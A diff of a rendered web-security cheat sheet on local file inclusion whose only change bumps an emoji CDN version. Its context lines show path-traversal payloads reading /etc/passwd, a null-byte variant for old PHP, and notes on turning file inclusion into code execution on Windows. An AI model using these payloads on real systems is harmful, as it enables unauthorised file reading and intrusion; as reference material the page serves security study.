@@ -6566,7 +6566,7 @@
 <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">http</span><span class="p">://</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="k">?</span><span class="n">page</span><span class="p">=../../../</span><span class="n">etc</span><span class="p">/</span><span class="n">passwd</span>
 </code></pre></div>
 <h3 id="null-byte">Null byte</h3>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> In versions of PHP below 5.3.4 we can terminate with null byte.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> In versions of PHP below 5.3.4 we can terminate with null byte.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">http</span><span class="p">://</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="k">?</span><span class="n">page</span><span class="p">=../../../</span><span class="n">etc</span><span class="p">/</span><span class="n">passwd</span><span class="k">%</span><span class="n">00</span>
 </code></pre></div>
 <h3 id="double-encoding">Double encoding</h3>
@@ -6781,7 +6781,7 @@ the string starts with A-Fa-f0-9</li>
 <a id="__codelineno-28-19" name="__codelineno-28-19" href="#__codelineno-28-19"></a><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[x] Something went wrong, please try again&#39;</span><span class="p">)</span>
 </code></pre></div>
 <h2 id="lfi-to-rce-via-upload-findfirstfile">LFI to RCE via upload (FindFirstFile)</h2>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> Only works on Windows</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> Only works on Windows</p>
 <p><code>FindFirstFile</code> allows using masks (<code>&lt;&lt;</code> as <code>*</code> and <code>&gt;</code> as <code>?</code>) in LFI paths on Windows. A mask is essentially a search pattern that can include wildcard characters, allowing users or developers to search for files or directories based on partial names or types. In the context of FindFirstFile, masks are used to filter and match the names of files or directories.</p>
 <ul>
 <li><code>*</code>/<code>&lt;&lt;</code> : Represents any sequence of characters.</li>
